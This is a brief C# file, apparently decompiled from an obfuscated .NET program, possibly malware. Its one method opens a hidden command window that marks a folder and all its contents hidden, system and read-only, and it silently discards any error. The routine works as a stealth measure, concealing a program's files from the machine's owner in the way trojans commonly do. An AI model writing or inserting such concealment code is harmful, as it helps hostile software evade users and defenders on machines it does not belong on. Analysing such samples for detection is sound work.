using System;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using ns21;

namespace ns1;

public class GClass1
{
	public static void smethod_0()
	{
		try
		{
			string text = "attrib +H +S +R \"" + (Interaction.Environ(GClass20.string_8) + "\\" + GClass20.string_9).TrimEnd(new char[1] { '\\' });
			Interaction.Shell("cmd /c " + text + "\" & " + text + "\\*\" /S /D", (AppWinStyle)0, false, -1);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
